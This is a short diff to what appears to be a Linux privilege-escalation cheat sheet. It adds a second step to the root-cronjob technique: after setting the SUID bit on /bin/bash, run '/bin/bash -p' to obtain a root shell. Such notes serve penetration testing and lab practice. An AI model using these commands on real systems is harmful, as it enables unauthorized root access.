@@ -61,6 +61,8 @@ ls -all /etc/cron.d
 ## if you find a cronjob running as root but can be editable run this command
 ```
 chmod u+s /bin/bash
+and then this,
+/bin/bash -p
 ```
 
 ## Writable /etc/passwd file found
